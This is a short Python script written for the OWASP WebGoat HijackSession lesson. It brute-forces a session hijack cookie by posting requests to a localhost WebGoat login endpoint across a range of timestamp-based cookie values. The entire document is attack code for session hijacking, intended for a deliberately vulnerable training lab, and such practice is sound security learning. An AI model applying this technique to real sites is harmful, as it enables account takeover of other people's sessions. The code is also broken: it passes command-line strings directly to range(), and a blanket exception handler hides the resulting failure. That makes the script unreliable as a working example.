##################################################
## Python script for use in brute forcing a valid hijack cookie for OWASP WebGoat HiJackSession lession
##################################################
## Author: Micah Wieburg
## License: MIT License
## Copyright: Copyright (c) 2024 mwieburg
## Project: OWASP Webgoat

import requests
import sys

#Define request body
body = {'username':'&',
	'password':''
       }
try:
   #Assign script parameters to variables
   timestart = sys.argv[1]
   timeend = sys.argv[2]
   cookie = sys.argv[3]
   sessionID = sys.argv[4]
   #Loop through start and end time range to brute force to a valid cookie
   for i in range(timestart,timeend):
     headers = {
		 'Accept': '*/*',
		 'Accept-Encoding':'gzip, deflate, br',
		 'Accept-Language':'en-US,en;q=0.5',
		 'Connection':'keep-alive',
		 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
		 'Cookie':'JSESSIONID='+str(sessionID)+';hijack_cookie='+cookie+'-'+str(i),
		 'Origin':'http://localhost:8080',
		 'Referer':'http://localhost:8080/WebGoat/start.mvc',
		 'Sec-Fetch-Dest':'empty',
		 'Sec-Fetch-Mode':'cors',
		 'Sec-Fetch-Site':'same-origin',
		 'User-Agent':'any',
		 'X-Requested-With':'XMLHttpRequest',
      }
     #Send post request
     response = requests.post('http://localhost:8080/WebGoat/HijackSession/login',data=body,timeout=5, headers=headers)
     data = response.json()
     print(response.headers)
     print(data)
except Exception as error:
  print("An exception occured:", error)
